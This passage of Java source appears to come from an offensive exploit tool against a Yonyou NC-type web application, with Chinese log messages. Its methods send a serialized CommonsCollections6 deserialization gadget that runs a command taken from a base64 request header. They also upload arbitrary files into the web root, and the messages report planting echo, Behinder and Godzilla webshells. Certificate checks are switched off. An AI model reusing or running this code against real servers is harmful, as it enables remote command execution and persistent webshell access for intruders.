                // 检测上传文件是否存在
                try {
                    HttpUtil.get(conn2);
                    int responseCode2 = HttpUtil.getResponseCode(conn2);
                    String responseText2 = HttpUtil.getResponseText(conn2);
                    if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(expFlag)) {
                        logMessage("[+] 文件上传成功! 同时写入回显/冰蝎/哥斯拉, 连接地址: " + fileUrl + "\n[+] 请求头与连接密码见 README.md.");
                        return;
                    } else {
                        logMessage("[-] 文件上传失败, 请尝试手动利用.");
                        return;
                    }

                } catch (Exception e) {
                    logMessage("[-] 文件上传失败, 请尝试手动利用. " + e);
                    return;
                }

            } else {
                logMessage("[-] 文件上传失败, 请尝试手动利用.");
                return;
            }
        } catch (Exception e) {
            logMessage("[-] 文件上传失败, 请尝试手动利用. " + e);
            return;
        }
    }

    private void exec(String url) {
        try {
            URL apiUrl = new URL(url);

            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            // 发送请求
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.Tomcat7Echo, ClassCode.Tomcat7Echo_testzxcv4}));
            HttpURLConnection exec_conn = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(exec_conn);

            // 设置请求头
            exec_conn.setRequestProperty("Content-Type", "application/octet-stream");
            exec_conn.setRequestProperty("Content-Length", String.valueOf(baos.toByteArray().length));
            exec_conn.setRequestProperty("testzxcv4", pocFlag + Util.byteCodeToBase64(Config.CMD.getBytes()));

            HttpUtil.post(exec_conn, baos.toByteArray());

            int responseCode = HttpUtil.getResponseCode(exec_conn);

            if (responseCode == HttpURLConnection.HTTP_OK ) {
                String responseText = HttpUtil.getResponseText(exec_conn);
                logExec("[+] 命令执行成功!\n" + responseText);
                return;
            } else {
                logExec("[-] 命令执行失败. 请尝试手动利用.");
                return;
            }
        } catch (Exception e) {
            logExec("[-] 命令执行失败, 请尝试手动利用. " + e);
            return;
        }
    }

    private void upload(String url) {
        try {
            URL apiUrl = new URL(url);
            // 设置全局http代理
            HttpProxy.setProxy();

            // 信任ssl证书
            SSLUtil.trustAllCertificates();

            // 定义上传文件名与内容
            String filename = Config.FILENAME;
            String fileText = Config.FILETEXT;

            // 构造请求体
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            HashMap map = new HashMap();
            map.put("cmd", "saveFile");
            map.put("id", "webapps\\nc_web\\" + filename);
            map.put("group", "");
            oos.writeObject(map);
            byte[] postData = Util.byteArrayMerger(baos.toByteArray(), fileText.getBytes(StandardCharsets.UTF_8));

            HttpURLConnection conn1 = (HttpURLConnection) apiUrl.openConnection();

            // 设置超时
            HttpUtil.setTimeout(conn1);

            // 设置请求头
            conn1.setRequestProperty("Content-Type", "multipart/form-data");
            conn1.setRequestProperty("Content-Length", String.valueOf(postData.length));

            HttpUtil.post(conn1, postData);

            int responseCode1 = HttpUtil.getResponseCode(conn1);

            if (responseCode1 == HttpURLConnection.HTTP_OK) {
                URL fileUrl = new URL(Config.TARGET + "/" + filename);

                HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();

                // 设置超时
                HttpUtil.setTimeout(conn2);

                // 检测上传文件是否存在
                try {
                    HttpUtil.get(conn2);
                    int responseCode2 = HttpUtil.getResponseCode(conn2);

                    if (responseCode2 == HttpURLConnection.HTTP_OK) {
                        logUpload("[+] 文件上传成功, 文件地址: " + fileUrl);
                    } else {
                        logUpload("[-] 文件上传失败, 请尝试手动利用.");
                        return;
                    }

                } catch (Exception e) {
                    logUpload("[-] 文件上传失败, 请尝试手动利用. " + e);
                    return;
                }

            } else {
                logUpload("[-] 文件上传失败, 请尝试手动利用. ");
                return;
            }
        } catch (Exception e) {
            logUpload("[-] 文件上传失败, 请尝试手动利用. " + e);
            return;
        }
    }
}
